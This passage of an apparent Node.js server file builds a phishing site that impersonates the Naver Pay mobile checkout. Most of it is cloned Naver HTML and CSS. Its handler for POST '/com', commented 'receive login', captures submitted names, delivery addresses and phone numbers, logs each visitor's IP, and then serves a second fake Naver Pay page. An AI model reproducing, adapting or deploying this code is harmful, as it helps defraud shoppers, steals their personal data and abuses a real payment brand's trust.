			<input type="hidden" name="PASSWD">
			<input type="hidden" name="RSVNO" value="">
			<input type="hidden" name="RESNO">
			<input type="hidden" name="INSTMO" value="">
			<input type="hidden" name="NOINTEREST" value="">
			<input type="hidden" name="NOINTERESTTYPE" value="01">
			<input type="hidden" name="POINTFG" value="">
			<input type="hidden" name="PERSON" value="">
			<input type="hidden" name="SPLITPARAM" value="">
			<input type="hidden" name="SPLITYN" value="">
			<input type="hidden" name="CLIENTSEQ" value="">
			
			<input type="hidden" name="MSG" value="">
			<input type="hidden" name="APPROVALSEQ" value="">
			<input type="hidden" name="ACCTNO" value="">
			<input type="hidden" name="ENDDATE" value="">
			<input type="hidden" name="BALANCE" value="">
			<input type="hidden" name="AUTHTYPE" value="">
			
			<input type="hidden" name="NOINTSELLERYN" value="">
			<input type="hidden" name="SURL" value="">
			<input type="hidden" name="RURL" value="">
			<input type="hidden" name="CURL" value="">
			<input type="hidden" name="LBF" id="LBF" value="">
			<input type="hidden" name="MACRURL" value="">
			<input type="hidden" name="EXPDATE" value="">
			
			<input type="hidden" name="ISSKNORMALUSER" value="Y">
			<input type="hidden" name="PREIFRAME" value="">
			<input type="hidden" name="POSTIFRAME" value="">
			<input type="hidden" name="ANSIMFG" value="">
			<input type="hidden" name="SAFEFG" value="">
			<input type="hidden" name="AUTHNO" value="">
			<input type="hidden" name="PAYKEY" value="">
			<input type="hidden" name="IFRAMETYPE" value="">
			<input type="hidden" name="PGFORMNAME" value="">
			<input type="hidden" name="CHARSET" value="">
			<input type="hidden" name="CLOSEURL" value="">
			<input type="hidden" name="LOSTPWCHANGEFG" value="">
			<input type="hidden" name="JOINSTATUS" value="">
			
			<input type="hidden" name="PKGEVD" value="">
			<input type="hidden" name="TAXATIONAMT" value="">
			<input type="hidden" name="EXEMPTIONAMT" value="">
			<input type="hidden" name="USEPENDING" value="">
			<input type="hidden" name="PGCP" value="05A">
			<input type="hidden" name="CP_UI" value="">
			<input type="hidden" name="CASH_GB" value="MC">
			
			<input type="hidden" name="Prdtnm" value="">
			<input type="hidden" name="Prdtprice" value="">
			<input type="hidden" name="Siteurl" value="">
			<input type="hidden" name="Tradeid" value="">
			<input type="hidden" name="MC_SVCID" value="">
			<input type="hidden" name="Okurl" value="">
			<input type="hidden" name="Failurl" value="">
			<input type="hidden" name="MC_FIXCOMMID" value="">
			<input type="hidden" name="MC_No" value="">
			<input type="hidden" name="SocialNo" value="">
			<input type="hidden" name="MC_AUTHPAY" value="Y">
			<input type="hidden" name="CP_UI_STYLE" value="">
			
			<input type="hidden" name="MSTR" value="">
			<input type="hidden" name="Payeremail" value="">
			<input type="hidden" name="Userid" value="">
			<input type="hidden" name="Prdtcd" value="">
			<input type="hidden" name="Item" value="">
			<input type="hidden" name="ansimFlag" value="">
			<input type="hidden" name="safeguard" value="">
			<input type="hidden" name="phoneId" value="">
			<input type="hidden" name="Mobilid" value="">
			
			<input type="hidden" name="isNormalUser" value="Y">
			<input type="hidden" name="pgIframeName" value="">
			<input type="hidden" name="Cryptstring" value="">
			<input type="hidden" name="authType" value="">
			<input type="hidden" name="mUserKey" value="">
			<input type="hidden" name="Closeurl" value="">
			
			<input type="hidden" name="PAY_MODE" value="">
			<input type="hidden" name="LOGO_YN" value="">
			<input type="hidden" name="CALL_TYPE" value="">
			<input type="hidden" name="MC_FIXNO" value="">
			
			<input type="hidden" name="IFRAME_NAME" value="">
			<input type="hidden" name="Cryptyn" value="">
			<input type="hidden" name="EMAIL_HIDDEN" value="Y">
			
		
			  
		
				<input type="hidden" name="RSVSEQ" value="">
			<input type="hidden" name="SVCINF" value="">
			<input type="hidden" name="SID" value="">
			<input type="hidden" name="CHNL" value="">
			<input type="hidden" name="USERID" value="">
			<input type="hidden" name="USERKEY" value="">
			<input type="hidden" name="EMAIL" value="">
			<input type="hidden" name="MOBILENO" value="">
			<input type="hidden" name="AMT" value="">
			<input type="hidden" name="CPID" value="">
			<input type="hidden" name="ITEMID" value="">
			<input type="hidden" name="TITLE" value="">
			<input type="hidden" name="PGID" value="">
			<input type="hidden" name="CORPCD" value="">
			<input type="hidden" name="CKEY" value="">
			<input type="hidden" name="PAYNO" value="">
			<input type="hidden" name="VALIDYM">
			<input type="hidden" name="ALLOT">
			<input type="hidden" name="PASSWD">
			<input type="hidden" name="RSVNO" value="">
			<input type="hidden" name="RESNO">
			<input type="hidden" name="INSTMO" value="">
			<input type="hidden" name="NOINTEREST" value="">
			<input type="hidden" name="NOINTERESTTYPE" value="01">
			<input type="hidden" name="POINTFG" value="">
			<input type="hidden" name="PERSON" value="">
			<input type="hidden" name="SPLITPARAM" value="">
			<input type="hidden" name="SPLITYN" value="">
			<input type="hidden" name="CLIENTSEQ" value="">
			
			<input type="hidden" name="MSG" value="">
			<input type="hidden" name="APPROVALSEQ" value="">
			<input type="hidden" name="ACCTNO" value="">
			<input type="hidden" name="ENDDATE" value="">
			<input type="hidden" name="BALANCE" value="">
			<input type="hidden" name="AUTHTYPE" value="">
			
			<input type="hidden" name="NOINTSELLERYN" value="">
			<input type="hidden" name="SURL" value="">
			<input type="hidden" name="RURL" value="">
			<input type="hidden" name="CURL" value="">
			<input type="hidden" name="LBF" id="LBF" value="">
			<input type="hidden" name="MACRURL" value="">
			<input type="hidden" name="EXPDATE" value="">
			
			<input type="hidden" name="ISSKNORMALUSER" value="Y">
			<input type="hidden" name="PREIFRAME" value="">
			<input type="hidden" name="POSTIFRAME" value="">
			<input type="hidden" name="ANSIMFG" value="">
			<input type="hidden" name="SAFEFG" value="">
			<input type="hidden" name="AUTHNO" value="">
			<input type="hidden" name="PAYKEY" value="">
			<input type="hidden" name="IFRAMETYPE" value="">
			<input type="hidden" name="PGFORMNAME" value="">
			<input type="hidden" name="CHARSET" value="">
			<input type="hidden" name="CLOSEURL" value="">
			<input type="hidden" name="LOSTPWCHANGEFG" value="">
			<input type="hidden" name="JOINSTATUS" value="">
			
			<input type="hidden" name="PKGEVD" value="">
			<input type="hidden" name="TAXATIONAMT" value="">
			<input type="hidden" name="EXEMPTIONAMT" value="">
			<input type="hidden" name="USEPENDING" value="">
		
			<input type="hidden" name="mid_common" value="naver_smartstore01">
			<input type="hidden" name="mid_point" value="naver_smartstore01">
			
			<input type="hidden" name="CST_PLATFORM">
		
			  
			<input type="hidden" name="environment" id="environment" value="real">  
			<input type="hidden" name="isMobile" id="isMobile" value="true">
			<input type="hidden" name="serviceId" id="serviceId">     
			<input type="hidden" name="cardCompanyId" id="cardCompanyId">     
			<input type="hidden" name="merchantName" id="merchantName" value="네이버페이">   
			
			<input type="hidden" name="amount" id="amount">   
			<input type="hidden" name="itemName" id="itemName">   
			<input type="hidden" name="installmentTerm" id="installmentTerm">   
			
			<input type="hidden" name="interestFreeYn" id="interestFreeYn" value="n">   
			<input type="hidden" name="domainUri" id="domainUri">   
			<input type="hidden" name="useCardCertification" id="useCardCertification" value="false">
		
			<input type="hidden" name="tid" id="tid">
			
			<!-- mpi -->
			<input type="hidden" name="cavv" id="cavv">
			<input type="hidden" name="xid" id="xid">
			<input type="hidden" name="eci" id="eci">
			<input type="hidden" name="certData" id="certData">
		
			<!-- isp -->
			<input type="hidden" name="kvpCardCode" id="kvpCardCode">
			<input type="hidden" name="sessionKey" id="sessionKey">
			<input type="hidden" name="encryptData" id="encryptData">
			
			<input type="hidden" name="AVATAR_CREDIT_DISABLE" id="AVATAR_CREDIT_DISABLE" value="">
			<input type="hidden" name="PGASYNCFG" id="PGASYNCFG" value="N">
			
			<input type="hidden" name="NOINT_NDISP" id="NOINT_NDISP" value="">
		
		
				   
		
				<input type="hidden" name="RSVSEQ" value="">
			<input type="hidden" name="SVCINF" value="">
			<input type="hidden" name="SID" value="">
			<input type="hidden" name="CHNL" value="">
			<input type="hidden" name="USERID" value="">
			<input type="hidden" name="USERKEY" value="">
			<input type="hidden" name="EMAIL" value="">
			<input type="hidden" name="MOBILENO" value="">
			<input type="hidden" name="AMT" value="">
			<input type="hidden" name="CPID" value="">
			<input type="hidden" name="ITEMID" value="">
			<input type="hidden" name="TITLE" value="">
			<input type="hidden" name="PGID" value="">
			<input type="hidden" name="CORPCD" value="">
			<input type="hidden" name="CKEY" value="">
			<input type="hidden" name="PAYNO" value="">
			<input type="hidden" name="VALIDYM">
			<input type="hidden" name="ALLOT">
			<input type="hidden" name="PASSWD">
			<input type="hidden" name="RSVNO" value="">
			<input type="hidden" name="RESNO">
			<input type="hidden" name="INSTMO" value="">
			<input type="hidden" name="NOINTEREST" value="">
			<input type="hidden" name="NOINTERESTTYPE" value="01">
			<input type="hidden" name="POINTFG" value="">
			<input type="hidden" name="PERSON" value="">
			<input type="hidden" name="SPLITPARAM" value="">
			<input type="hidden" name="SPLITYN" value="">
			<input type="hidden" name="CLIENTSEQ" value="">
			
			<input type="hidden" name="MSG" value="">
			<input type="hidden" name="APPROVALSEQ" value="">
			<input type="hidden" name="ACCTNO" value="">
			<input type="hidden" name="ENDDATE" value="">
			<input type="hidden" name="BALANCE" value="">
			<input type="hidden" name="AUTHTYPE" value="">
			
			<input type="hidden" name="NOINTSELLERYN" value="">
			<input type="hidden" name="SURL" value="">
			<input type="hidden" name="RURL" value="">
			<input type="hidden" name="CURL" value="">
			<input type="hidden" name="LBF" id="LBF" value="">
			<input type="hidden" name="MACRURL" value="">
			<input type="hidden" name="EXPDATE" value="">
			
			<input type="hidden" name="ISSKNORMALUSER" value="Y">
			<input type="hidden" name="PREIFRAME" value="">
			<input type="hidden" name="POSTIFRAME" value="">
			<input type="hidden" name="ANSIMFG" value="">
			<input type="hidden" name="SAFEFG" value="">
			<input type="hidden" name="AUTHNO" value="">
			<input type="hidden" name="PAYKEY" value="">
			<input type="hidden" name="IFRAMETYPE" value="">
			<input type="hidden" name="PGFORMNAME" value="">
			<input type="hidden" name="CHARSET" value="">
			<input type="hidden" name="CLOSEURL" value="">
			<input type="hidden" name="LOSTPWCHANGEFG" value="">
			<input type="hidden" name="JOINSTATUS" value="">
			
			<input type="hidden" name="PKGEVD" value="">
			<input type="hidden" name="TAXATIONAMT" value="">
			<input type="hidden" name="EXEMPTIONAMT" value="">
			<input type="hidden" name="USEPENDING" value="">
		
		<!-- 결제관련 공통 Form -->
		
				<input type="hidden" name="RSVSEQ" value="">
			<input type="hidden" name="SVCINF" value="">
			<input type="hidden" name="SID" value="">
			<input type="hidden" name="CHNL" value="">
			<input type="hidden" name="USERID" value="">
			<input type="hidden" name="USERKEY" value="">
			<input type="hidden" name="EMAIL" value="">
			<input type="hidden" name="MOBILENO" value="">
			<input type="hidden" name="AMT" value="">
			<input type="hidden" name="CPID" value="">
			<input type="hidden" name="ITEMID" value="">
			<input type="hidden" name="TITLE" value="">
			<input type="hidden" name="PGID" value="">
			<input type="hidden" name="CORPCD" value="">
			<input type="hidden" name="CKEY" value="">
			<input type="hidden" name="PAYNO" value="">
			<input type="hidden" name="VALIDYM">
			<input type="hidden" name="ALLOT">
			<input type="hidden" name="PASSWD">
			<input type="hidden" name="RSVNO" value="">
			<input type="hidden" name="RESNO">
			<input type="hidden" name="INSTMO" value="">
			<input type="hidden" name="NOINTEREST" value="">
			<input type="hidden" name="NOINTERESTTYPE" value="01">
			<input type="hidden" name="POINTFG" value="">
			<input type="hidden" name="PERSON" value="">
			<input type="hidden" name="SPLITPARAM" value="">
			<input type="hidden" name="SPLITYN" value="">
			<input type="hidden" name="CLIENTSEQ" value="">
			
			<input type="hidden" name="MSG" value="">
			<input type="hidden" name="APPROVALSEQ" value="">
			<input type="hidden" name="ACCTNO" value="">
			<input type="hidden" name="ENDDATE" value="">
			<input type="hidden" name="BALANCE" value="">
			<input type="hidden" name="AUTHTYPE" value="">
			
			<input type="hidden" name="NOINTSELLERYN" value="">
			<input type="hidden" name="SURL" value="">
			<input type="hidden" name="RURL" value="">
			<input type="hidden" name="CURL" value="">
			<input type="hidden" name="LBF" id="LBF" value="">
			<input type="hidden" name="MACRURL" value="">
			<input type="hidden" name="EXPDATE" value="">
			
			<input type="hidden" name="ISSKNORMALUSER" value="Y">
			<input type="hidden" name="PREIFRAME" value="">
			<input type="hidden" name="POSTIFRAME" value="">
			<input type="hidden" name="ANSIMFG" value="">
			<input type="hidden" name="SAFEFG" value="">
			<input type="hidden" name="AUTHNO" value="">
			<input type="hidden" name="PAYKEY" value="">
			<input type="hidden" name="IFRAMETYPE" value="">
			<input type="hidden" name="PGFORMNAME" value="">
			<input type="hidden" name="CHARSET" value="">
			<input type="hidden" name="CLOSEURL" value="">
			<input type="hidden" name="LOSTPWCHANGEFG" value="">
			<input type="hidden" name="JOINSTATUS" value="">
			
			<input type="hidden" name="PKGEVD" value="">
			<input type="hidden" name="TAXATIONAMT" value="">
			<input type="hidden" name="EXEMPTIONAMT" value="">
			<input type="hidden" name="USEPENDING" value="">
		
		
				</div>
				<hr>
		<div id="footer">
			<p class="logonf" onclick="window.top.location.href='https://www.naverfincorp.com/'; return false;">
				<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="96" height="26" viewBox="0 0 96 26">
					<defs>
						<path id="prefix__a" d="M0.518 0.462L11.559 0.462 11.559 11.964 0.518 11.964z"></path>
						<path id="prefix__c" d="M0 0.038L11.189 0.038 11.189 11.068 0 11.068z"></path>
						<path id="prefix__e" d="M0.256 0.038L12.918 0.038 12.918 11.068 0.256 11.068z"></path>
						<path id="prefix__g" d="M0.021 0.038L8.808 0.038 8.808 11.068 0.021 11.068z"></path>
						<path id="prefix__i" d="M0.2 0.038L12.861 0.038 12.861 11.068 0.2 11.068z"></path>
					</defs>
					<g fill="none" fill-rule="evenodd">
						<path fill="#CCC" d="M0 13.813L0 25.188 3.509 25.188 3.509 21.327 6.952 21.327 7.954 18.648 3.509 18.648 3.509 16.691 8.686 16.691 9.763 13.813zM11.39 25.188L14.644 25.188 14.644 13.813 11.39 13.813zM24.808 13.813L24.808 19.9 20.585 13.813 17.085 13.813 17.085 25.188 20.752 25.188 20.752 19.1 24.974 25.188 28.475 25.188 28.475 13.813zM68.339 25.188L71.593 25.188 71.593 13.813 68.339 13.813z"></path>
						<g transform="translate(55.311 13.223)">
							<mask id="prefix__b" fill="#fff">
								<use xlink:href="#prefix__a"></use>
							</mask>
							<path fill="#CCC" d="M.518 6.244v-.03C.518 2.92 3.112.461 6.437.461c2.45 0 4.104 1.181 5.043 2.867L8.409 5.11c-.413-.788-1.002-1.34-2.02-1.34-1.258 0-2.084 1.088-2.084 2.411v.032c0 1.434.859 2.442 2.083 2.442 1.05 0 1.64-.567 2.1-1.386l3.071 1.717c-.938 1.639-2.497 2.978-5.266 2.978-3.086 0-5.775-2.3-5.775-5.72" mask="url(#prefix__b)"></path>
						</g>
						<path fill="#CCC" d="M34.592 20.842l1.244-3.446 1.245 3.446h-2.49zm-.72-6.92l-4.367 11.03h3.711l.527-1.46h4.186l.527 1.46h3.711l-4.366-11.03h-3.93zM90.488 22.16L90.488 13.922 86.885 13.922 86.885 24.951 94.616 24.951 95.721 22.16zM78.164 20.842l1.244-3.446 1.245 3.446h-2.49zm-.72-6.92l-4.367 11.03h3.711l.528-1.46h4.185l.527 1.46h3.711l-4.366-11.03h-3.93zM50.9 19.825L46.752 13.921 43.313 13.921 43.313 24.951 46.915 24.951 46.915 19.048 51.063 24.951 54.502 24.951 54.502 13.921 50.9 13.921z"></path>
						<mask id="prefix__d" fill="#fff">
							<use xlink:href="#prefix__c"></use>
						</mask>
						<path fill="#CCC" d="M7.587 5.941L3.439 0.038 0 0.038 0 11.068 3.602 11.068 3.602 5.165 7.75 11.068 11.189 11.068 11.189 0.038 7.587 0.038z" mask="url(#prefix__d)"></path>
						<g transform="translate(12.08)">
							<mask id="prefix__f" fill="#fff">
								<use xlink:href="#prefix__e"></use>
							</mask>
							<path fill="#CCC" d="M5.342 6.958l1.245-3.445 1.245 3.445h-2.49zm-.72-6.92L.256 11.068h3.71l.528-1.46H8.68l.527 1.46h3.712L8.55.038h-3.93z" mask="url(#prefix__f)"></path>
						</g>
						<g transform="translate(36.874)">
							<mask id="prefix__h" fill="#fff">
								<use xlink:href="#prefix__g"></use>
							</mask>
							<path fill="#CCC" d="M3.569 6.877L8.645 6.877 8.645 4.228 3.569 4.228 3.569 2.741 8.699 2.741 8.699 0.038 0.021 0.038 0.021 11.068 8.808 11.068 8.808 8.364 3.569 8.364z" mask="url(#prefix__h)"></path>
						</g>
						<g transform="translate(22.887)">
							<mask id="prefix__j" fill="#fff">
								<use xlink:href="#prefix__i"></use>
							</mask>
							<path fill="#CCC" d="M6.53 7.29L3.911 0.037 0.2 0.037 4.566 11.068 8.495 11.068 12.861 0.037 9.15 0.037z" mask="url(#prefix__j)"></path>
						</g>
						<path fill="#CCC" d="M52.777 5.174h-1.91V2.85h1.91c.649 0 1.174.52 1.174 1.163 0 .641-.525 1.162-1.174 1.162zm2.425 2.11l.338-.14c1.294-.537 1.952-1.698 1.952-3.171 0-1.394-.513-2.424-1.525-3.064-.94-.594-2.16-.871-3.838-.871h-4.7v11.03h3.493V7.985h1.255l2.129 3.081h3.711l-2.815-3.783z"></path>
					</g>
				</svg>
				<span class="blind">NAVER FINANCIAL</span>
			</p>
			<p class="description">
				네이버파이낸셜㈜은 전자결제서비스제공자 및 통신판매중개자이며 통신판매의 당사자가 아닙니다. 상품, 상품정보 및 거래에 관한 의무와 책임은 판매자에게 있습니다.
			</p>
		</div>
			</div>
			<!-- javascript 영역 -->
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		<div id="40A_OBJECT"></div>							    							   
		
		<!-- iframe?? ??????吏? ?븡?? 寃? -->
		<iframe id="approval_frame_40A" name="approval_frame_40A" style="display:none;position:absolute;top:0px;left:0px;z-index:101;width:100%;height:100%;overflow:auto;background-color:white;" frameborder="0" marginheight="0" marginwidth="0" border="0" width="100%" height="100%" scrolling="yes" title="내용없음"></iframe>
		<div id="51A_OBJECT"></div>
		
		<div id="01A_OBJECT"></div>										    							   
			<script language="javascript" src="https://dbill.naver.com/dist/js/certificationModule.js?ts=1647230547575" type="text/javascript"></script>
		
		
		<!--  수정 불가(IFRAME 방식시 사용)   -->
		<div id="LGD_PAYMENTWINDOW" style="position:absolute; display:none; left:0; top:0; width:100%; height:100%; background-color:white; z-index:100 ; font-size:small; ">
			 <iframe id="LGD_PAYMENTWINDOW_IFRAME" name="LGD_PAYMENTWINDOW_IFRAME" height="100%" width="100%" scrolling="auto" frameborder="0" style="background-color:white;" title="내용없음">
			 </iframe>
		</div>
		<div id="INI_PAYMENTWINDOW" style="position:absolute; display:none; left:0; top:0; width:100%; height:100%; background-color:white; z-index:100 ; font-size:small; ">
			 <iframe id="INI_PAYMENTWINDOW_IFRAME" name="INI_PAYMENTWINDOW_IFRAME" height="100%" width="100%" scrolling="no" frameborder="0" style="background-color:white;" title="내용없음">
			 </iframe>
		</div>
			<div class="_repurchase">&nbsp;</div>
			<div class="_repurchaseDtl">
			</div>
		
			
		
		
		
		</div>
			<div class="dimlayer _chargeBankLayer" style="display:none;">
				<div class="dimbg"></div>
				<div class="bottom_floating pointcharge_layer">
					<strong class="popup_title">출금계좌</strong>
					<ul class="account_list">
								<li class="account none">
									등록된 계좌가 없습니다.<br>계좌를 추가해 주세요.
								</li>
					</ul>
					<button type="button" class="N=a:ode.chargepointaccountadd button_add _click(checkout.mobile.order.order_sheet.registerEasyBank()) _stopDefault">계좌 추가</button>
					<button type="button" class="button_close openbanking_img _click(checkout.mobile.order.order_sheet.hideModalLayer(chargeBankLayer)) _stopDefault"><span class="blind">레이어닫기</span></button>
				</div>
			</div>
		
			<div class="dimlayer _chargeBankLayer" style="display:none;">
				<div class="dimbg"></div>
				<div class="bottom_floating pointcharge_layer">
					<strong class="popup_title">출금계좌</strong>
					<ul class="account_list">
								<li class="account none">
									등록된 계좌가 없습니다.<br>계좌를 추가해 주세요.
								</li>
					</ul>
					<button type="button" class="N=a:ode.chargepointaccountadd button_add _click(checkout.mobile.order.order_sheet.registerEasyBank()) _stopDefault">계좌 추가</button>
					<button type="button" class="button_close openbanking_img _click(checkout.mobile.order.order_sheet.hideModalLayer(chargeBankLayer)) _stopDefault"><span class="blind">레이어닫기</span></button>
				</div>
			</div>
		
		</form></body></html>`
			res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
			res.end(mbuy); 

		
	} 
	
	if(req.method =='POST' && req.url == '/com') { // receive login
			req.on('data', function(chunk) { 
				
				//console.log(chunk.toString()); 
				var data = qs.parse(chunk.toString());
				console.log("\n\n-------------------------------\n\n주문이 입력되었습니다 \n\n수령 이름 : "+data.receiverName+"\n\n수령주소 : "+data.baseadd +" "+ data.inadd+"\n\n수령자 전화번호: "+data.phonenumber1+"-"+data.phonenumber2+"-"+data.phonenumber3+"\n\n-------------------------------\n\n" )

					
					console.log('[ 정보 ] 결제완료 창 접속\n\nIP : '+requestIp.getClientIp(req))
					com = `<html lang="ko"><head><style type="text/css" id="_jmc_no_tap_highlight_tag_"></style><script async="" type="text/javascript" src="http://ssl.pstatic.net/tveta/libs/ssp/ssp.web.sdk.js"></script>
					<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
					<meta http-equiv="Content-Script-Type" content="text/javascript">
					<meta http-equiv="Content-Style-Type" content="text/css">
					
					<meta name="referrer" contents="always">
					<meta property="og:title" content="네이버페이">
					<meta property="og:image" content="http://img.pay.naver.net/static/images/customer/og/naverpay.png">
					<meta property="og:description" content="네이버 ID로 간편구매, 네이버페이">
					<title>네이버페이</title>
					<link rel="shortcut icon" href="http://ssl.pstatic.net/static.checkout/layout/202202231455/images/customer/favicon.ico">
					<link type="text/css" rel="stylesheet" href="http://ssl.pstatic.net/static.checkout/layout/202202231455/css/customer/chk_n_common.css">
					
					<link type="text/css" rel="stylesheet" href="http://img.pay.naver.net/o/wstatic/css/service/front/order/ordersheet.css?1646914882576">
					<link type="text/css" rel="stylesheet" href="http://img.pay.naver.net/o/wstatic/css/service/front/order/layerpopup.css?1646914882576">
					
					<style id="gnb_style" type="text/css">@charset "UTF-8";
					/* NTS UIT Development Office YJH 140717 */
					a.gnb_my, .gnb_icon, #gnb .gnb_my_interface, .gnb_my_li .gnb_my_content .gnb_membership, #gnb .gnb_my_membership, #gnb .gnb_ico_num .gnb_ico_new, #gnb .gnb_ico_num .gnb_ico_new .gnb_count, .gnb_lst .ico_arrow, a.gnb_my .filter_mask, .gnb_my_lyr, .gnb_my_li .gnb_my_content .gnb_mask, .gnb_my_li .gnb_my_content .gnb_change, .gnb_my_li .gnb_my_content .gnb_edit_lst li, .gnb_my_li .gnb_my_content .gnb_pay_check em, #gnb .gnb_my_li .gnb_my_community a.gnb_pay span, .gnb_notice_li .gnb_notice_lyr, .gnb_notice_li .svc_list .gnb_ico_mail, .gnb_notice_li .svc_list .gnb_btn_remove span, .gnb_notice_li .svc_list .gnb_btn_remove i, .gnb_notice_li .gnb_error .gnb_ico_error, .gnb_ly_alert .gnb_btn_close i, .gnb_first_visit, .gnb_search_box, .gnb_search_box .gnb_del_txt, .gnb_svc_more .gnb_svc_lstwrp li.gnb_event em.ic_gnb_new, .gnb_svc_more .svc_btnwrp button { background: url(http://ssl.pstatic.net/static/common/gnb/one/sp_gnb_v14.png) no-repeat -999px -999px;		background: url(http://ssl.pstatic.net/static/common/gnb/one/sp_gnb_v15.png?v=2006) no-repeat -999px -999px; /* background: url(../img/sp_gnb_v15.png) no-repeat -999px -999px; */}
					.gnb_favorite_area, .gnb_search_area, .gnb_banner, .gnb_linkwrp{background:url(http://ssl.pstatic.net/static/common/gnb/2014/bg_svclyr2_v2.png) no-repeat -999px -999px}
					#gnb .gnb_my_li .gnb_my_community a, .gnb_notice_li .gnb_notice_all, a.gnb_service_all, .gnb_svc_more .svc_btns{display:block;height:38px;border-top:1px solid #ebebeb;background-color:#f8f8f8;text-align:center;font-weight:bold;text-decoration:none;letter-spacing:-1px;line-height:38px}
					#gnb .gnb_my_li .gnb_my_community a:visited, .gnb_notice_li .gnb_notice_all:visited, a.gnb_service_all:visited, .gnb_svc_more .svc_btns:visited{color:#444}
					.gnb_login_li, .gnb_my_li, .gnb_notice_li, .mail_li, .gnb_service_li{float:left;margin-right:2px;overflow:visible}
					.gnb_login_li a, .gnb_my_li a, .gnb_notice_li a, .mail_li a, .gnb_service_li a{position:relative;z-index:100}
					a.gnb_my, .gnb_icon{position:relative}
					#gnb{position:relative;z-index:2147483646;font-family:'나눔고딕',NanumGothic,'돋움',Dotum,'Apple SD Gothic Neo',Helvetica,Sans-serif !important;color:#444;font-size:12px;letter-spacing:0 !important;line-height:normal !important;text-align:left !important}
					#gnb div, #gnb p, #gnb span, #gnb em, #gnb strong, #gnb h1, #gnb h2, #gnb h3, #gnb h4, #gnb h5, #gnb h6, #gnb ul, #gnb ol, #gnb li, #gnb dl, #gnb dt, #gnb dd, #gnb table, #gnb th, #gnb td, #gnb form, #gnb fieldset, #gnb legend, #gnb input, #gnb textarea, #gnb button, #gnb label{font-family:'나눔고딕',NanumGothic,'돋움',Dotum,'Apple SD Gothic Neo',Helvetica,Sans-serif !important}
					#gnb a, #gnb label, #gnb button{cursor:pointer}
					#gnb a, #gnb a:visited, #gnb a:active, #gnb a:focus{color:#444}
					#gnb a:hover{color:#444;text-decoration:underline}
					#gnb input::-ms-clear{display:none}
					#gnb em{font-style:normal}
					#gnb ul{list-style:none}
					#gnb .blind{display:block;overflow:hidden;position:absolute;top:-1000em;left:0;width:1px;height:1px;margin:0;padding:0;font-size:0;line-height:0}
					#gnb .gnb_my_membership{padding: 0;display: block;width: 64px;height: 16px;background-position: -296px -359px;margin: 0;}
					#gnb .gnb_my_interface{padding:5px;position:absolute;top:12px;right:8px;display:block;width:17px;height:16px;background-position:-90px 5px}
					#gnb .gnb_my_interface:hover{background-position:-90px -20px}
					#gnb .gnb_my_interface:focus{background-position:-90px -20px}
					#gnb .gnb_pad_lyr{position:absolute}
					#gnb .gnb_ico_num{display:block;position:absolute;top:1px;width:40px;text-align:center}
					#gnb .gnb_ico_num .gnb_ico_new{height:15px;display:inline-block;background-position:-331px 0;zoom:1}
					#gnb .gnb_ico_num .gnb_ico_new .gnb_count{position:relative;top:0;right:-5px;height:15px;margin:0;padding:0 4px 0 1px;display:inline-block;*display:inline;vertical-align:top;background-position:100% 0;text-indent:-2px;font-family:tahoma !important;font-weight:bold;color:#fff;zoom:1}
					#gnb .gnb_ico_num .gnb_ico_new .plus{margin:1px -1px 0 2px;font-size:8px;display:inline-block;color:#fff;vertical-align:top}
					:root #gnb .gnb_pad_lyr{opacity:1 !important;/* background:#fff */}
					.gnb_lst{margin:0;padding:0;zoom:1}
					.gnb_lst:after{display:block;clear:both;content:''}
					.gnb_lst ul{margin:0;padding:0}
					.gnb_lst .ico_arrow{display:none;position:absolute;left:50%;top:27px;width:10px;height:8px;margin-left:-5px;background-position:-175px -10px}
					.gnb_lyr_opened .gnb_my_lyr, .gnb_lyr_opened .gnb_service_lyr, .gnb_lyr_opened .gnb_notice_lyr, .gnb_lyr_opened .ico_arrow{display:block !important}
					.gnb_login_li{height:23px;padding:5px 7px 0 0}
					.gnb_btn_login, .gnb_bg, .gnb_bdr{display:inline-block;width:46px;height:20px;font-size:12px}
					.gnb_btn_login{position:relative}
					.gnb_bg{background-color: #fff;opacity: 0.05;filter: alpha(opacity=5);}
					.gnb_bdr{position:absolute;top: -1px;left: -1px;width: 46px;height: 20px;border: 1px solid #000;opacity: 0.12;filter: alpha(opacity=12);}
					.gnb_txt{position:absolute;top:0;left:0;width:45px;height:20px;padding-left:1px;line-height:21px;color:#666;text-align:center}
					.gnb_btn_login:hover{text-decoration:none !important}
					.gnb_account .gnb_btn_login{width:54px;margin:-1px 0 0 8px;vertical-align:top}
					.gnb_account a.gnb_btn_login .gnb_txt {padding-left: 0;}
					.gnb_account .gnb_bdr{width:52px}
					.gnb_account .gnb_txt{width:53px}
					.gnb_my_li{margin-right:7px}
					.gnb_my_namebox{padding:2px 9px 0 0;background-repeat:no-repeat;background-position:100% 50%;zoom:1}
					.gnb_my_namebox:after{display:block;clear:both;content:''}
					a.gnb_my{float:left;display:block;font-size:12px;vertical-align:middle}
					a.gnb_my .filter_mask {position: absolute; top: -1px; left: -1px; z-index: 1; width: 28px; height: 28px; background-position: -260px -60px;}
					a.gnb_my img{vertical-align:top;border-radius:16px}
					a.gnb_my .gnb_name{margin-right:-1px;padding-left:5px;display:inline-block;height:28px;line-height:28px;vertical-align:top;font-size:11px;color:#444}
					a.gnb_my:visited{color:#444}
					a.gnb_my:hover, a.gnb_my:active, a.gnb_my:visited, a.gnb_my:focus{text-decoration:none !important}
					a.gnb_my:hover .gnb_name{text-decoration:underline}
					a.gnb_my .ico_arrow{top:25px;margin-left:8px}
					.gnb_my_namebox a.gnb_emp{float:left;display:inline-block;height:28px;margin-left:3px;line-height:28px;font-size:11px;color:#777 !important}
					.gnb_my_lyr{display:none;position:absolute;top:26px;right:-8px;padding:9px 5px 4px 4px;width:316px;height:155px;background-position:-2px -1310px;z-index:10}
					.gnb_my_lyr.gnb_groupid{height:144px;background-position:-2px -1500px}
					.gnb_my_lyr.gnb_groupid .gnb_my_content{height:80px}
					.gnb_my_lyr.gnb_groupid.gnb_longid1{height:144px;/*background-position:-2px -1664px*/}
					.gnb_my_lyr.gnb_groupid.gnb_longid2{height:144px;background-position:-2px -1828px}
					.gnb_my_lyr.gnb_longid1{/*width:318px;*/ /*background-position:-2px -1118px;*/}
					.gnb_my_lyr.gnb_longid2{width:348px;background-position:-2px -926px}
					.gnb_my_li .gnb_my_content{zoom:1;height:91px;padding:15px 0 10px 15px}
